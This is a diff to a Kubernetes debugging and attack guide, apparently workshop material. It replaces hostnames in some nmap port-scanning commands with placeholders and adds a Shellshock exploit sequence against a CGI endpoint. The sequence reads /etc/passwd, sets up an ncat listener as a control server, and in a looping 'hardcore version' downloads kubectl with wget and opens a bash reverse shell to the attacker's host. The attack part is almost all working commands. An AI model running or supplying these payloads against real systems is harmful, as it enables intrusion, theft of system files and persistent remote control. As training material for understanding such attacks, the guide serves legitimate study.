@@ -38,6 +38,9 @@ This guide has been created to help engineers debug applications that are deploy
 | Command                                                      | Description                               |
 | ------------------------------------------------------------ | ----------------------------------------- |
 | `kubectl exec -ti <pod_name> -- /bin/sh -c  "curl -v <br /> telnet://<service_name>:<service-port>"` | testing TCP connectivity between services |
+|                                                              |                                           |
+|                                                              |                                           |
+|                                                              |                                           |
 
 ## Other resources
 
@@ -82,9 +85,40 @@ nmap-kube-discover
 Useful commands for finding open ports:
 
 ```
-command nmap -Pn -T4 -F --open kube-andy-1
+command nmap -Pn -T4 -F --open <host-ip>
 # scanning every port, more is open
-command nmap -Pn -T4 --open kube-andy-1 -p 0-65535
-command nmap -Pn -T4 --open kube-andy-1 -p 30081
+command nmap -Pn -T4 --open <host-ip> -p 0-65535
+command nmap -Pn -T4 --open <host-ip> -p 30081
 ```
 
+1. Check shellshock
+
+   ```
+   curl http://<host_ip>:30081/cgi-bin/stats  -H 'user-agent: () { :; }; echo; echo; 2>&1 /bin/bash -c "cat /etc/passwd"'
+   ```
+
+2. create a control server to use as a reverse shell endpoint
+
+   this requires any node with a public IP (a digital ocean server would do)
+
+   ```
+   # replace `controlplane` with a host that you can SSH to
+   ssh controlplane ip a
+   
+   # replace 1234 with a port that is routable on the host you have SSH'd into
+   while :; do ssh controlplane ncat --listen 1234 --output $(mktemp /tmp/hack-XXXX.log); done
+   ```
+
+3. shellshock in
+
+   
+
+   ```
+    curl http://<host_ip>:30081/cgi-bin/stats  -H 'user-agent: () { :; }; echo; echo; 2>&1 /bin/bash -c "echo hello"'
+   ```
+
+   Hardcore version:
+
+   ```
+   while :; do curl http://<host_ip>:30081/cgi-bin/stats  -H 'user-agent: () { :; }; echo; echo; 2>&1 /bin/bash -c "test -f /tmp/k || wget -O /tmp/k https://storage.googleapis.com/kubernetes-release/release/v1.11.2/bin/linux/amd64/kubectl && chmod +x /tmp/k && /tmp/k version; df -h; while :; do nohup bash -i >& /dev/tcp/<host_ip>/1234 0>&1; sleep 1; done"'; done
+   ```
